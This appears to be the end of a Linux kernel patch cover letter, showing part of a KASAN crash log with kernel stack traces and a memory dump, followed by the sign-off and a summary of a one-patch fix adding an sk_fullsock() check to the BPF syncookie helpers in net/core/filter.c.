[  468.048372][    C0]  post_alloc_hook+0xe6/0x100
[  468.048876][    C0]  get_page_from_freelist+0x55c/0x2210
[  468.049478][    C0]  __alloc_frozen_pages_noprof+0x221/0x1cb0
[  468.050575][    C0]  new_slab+0xa2/0x5f0
[  468.051090][    C0]  refill_objects+0xe3/0x430
[  468.051540][    C0]  __pcs_replace_empty_main+0x2ed/0x650
[  468.052018][    C0]  kmem_cache_alloc_noprof+0x559/0x6d0
[  468.052527][    C0]  inet_reqsk_alloc+0x8e/0x3f0
[  468.052969][    C0]  tcp_conn_request+0x39f/0x1cf0
[  468.053462][    C0]  tcp_v4_conn_request+0x8d/0x200
[  468.053919][    C0]  tcp_rcv_state_process+0x432/0x3cb0
[  468.054418][    C0]  tcp_v4_do_rcv+0x328/0xb30
[  468.054841][    C0]  tcp_v4_rcv+0x2a53/0x2d00
[  468.055286][    C0]  ip_protocol_deliver_rcu+0x81/0x3e0
[  468.055792][    C0]  ip_local_deliver_finish+0x1f0/0x450
[  468.056307][    C0]  ip_local_deliver+0xfb/0x120
[  468.056777][    C0] page last free pid 9944 tgid 9944 stack trace:
[  468.057346][    C0]  __free_frozen_pages+0x52d/0x960
[  468.057821][    C0]  qlist_free_all+0x47/0xf0
[  468.058539][    C0]  kasan_quarantine_reduce+0x195/0x1e0
[  468.059089][    C0]  __kasan_slab_alloc+0x69/0x90
[  468.059530][    C0]  kmem_cache_alloc_noprof+0x23a/0x6d0
[  468.060050][    C0]  vm_area_alloc+0x1f/0xc0
[  468.060473][    C0]  __mmap_region+0xef4/0x21d0
[  468.060967][    C0]  mmap_region+0x2db/0x4c0
[  468.061371][    C0]  do_mmap+0xa38/0xd80
[  468.061941][    C0]  vm_mmap_pgoff+0x255/0x3d0
[  468.062429][    C0]  ksys_mmap_pgoff+0x332/0x480
[  468.062844][    C0]  __x64_sys_mmap+0xa5/0xd0
[  468.063318][    C0]  do_syscall_64+0x116/0x800
[  468.063729][    C0]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  468.064294][    C0] 
[  468.064523][    C0] Memory state around the buggy address:
[  468.065095][    C0]  ffff88804a2fef80: fc fc fc fc fc fc fc fc fc fc fc fc fc
[  468.065938][    C0]  ffff88804a2ff000: fc fc fc fc fc fc fc fc fc fc fc fc fc
[  468.066741][    C0] >ffff88804a2ff080: fc fc fc fc fc fc fc fc fc fc fc fc fc
[  468.067422][    C0]                                   ^
[  468.067920][    C0]  ffff88804a2ff100: fc fc fc fc fc fc fc fc fc fc fc fc fc
[  468.068668][    C0]  ffff88804a2ff180: fc fc fc fc fc fc fc fc fc fc fc fc fc
[  468.069504][    C0] =========================================================


-----END crash log-----

Best regards,
Luxiao Xu

Luxiao Xu (1):
  bpf: Check sk_fullsock() in bpf_tcp_*_syncookie

 net/core/filter.c | 6 ++++++
 1 file changed, 6 insertions(+)

-- 
2.43.0

